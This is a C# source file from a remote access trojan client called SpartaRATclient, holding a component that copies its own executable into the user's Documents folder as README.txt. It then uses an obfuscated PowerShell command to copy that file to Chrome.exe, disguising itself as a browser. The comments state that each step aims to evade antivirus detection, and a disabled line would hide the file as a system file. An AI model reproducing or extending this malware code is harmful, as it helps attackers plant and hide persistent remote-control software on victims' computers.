using SpartaRATclient.Tools;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace SpartaRATclient
{
    public class FileCopy
    {
        //File copy
        public static String This()
        {
            //copy the exe file to new path as txt file to make it harder for the anti virus to detect this as a malware
            string NewPath = @"C:\Users\" + Environment.UserName + @"\Documents\README.txt";
            FileInfo fileInfo = new FileInfo(NewPath);
            if (!fileInfo.Exists)
            {
                try
                {
                    File.Copy(Assembly.GetExecutingAssembly().Location, NewPath, true);
                    //copy the chrome.txt file into chrome.exe file using powershell encodings to make it harder for the anti virus to detect us. I used the OG tool "Invoke-Obfuscation" by danielbohannon. original command: copy "C:\Users\$env:username\Documents\Chrome.txt" "C:\Users\$env:username\Documents\Chrome.exe"
                    Shell.Run(@"  &  ( ""{0}{1}""-f 'c',('op' +  'y' ) ) ""C:\Users\$env:username\Documents\README.txt"" ""C:\Users\$env:username\Documents\Chrome.exe""", 0);
                    //Anti viruses may do bad things because of this code line, which hidding the file, and mark that file as a system file to make sure he will not be deleted
                    //Fixed: bug that when server trying to use the "delete client program" feature, the File.Exists C# function cannot find that file OR cant delete because of missing permissions (even when trying to delete as administrator). solution is to use -h -s attributes with this command and only then delete the file.
                    
                    //Disabled for lower the anti virus detection
                    //Shell.Run($"attrib.exe +h +s \"{NewPath}\"", 0);
                }
                catch (Exception r)
                {
                    //@TODO: Send errors to server
                }
            }
            else
                return "exist";
            return NewPath;
        }
    }
}
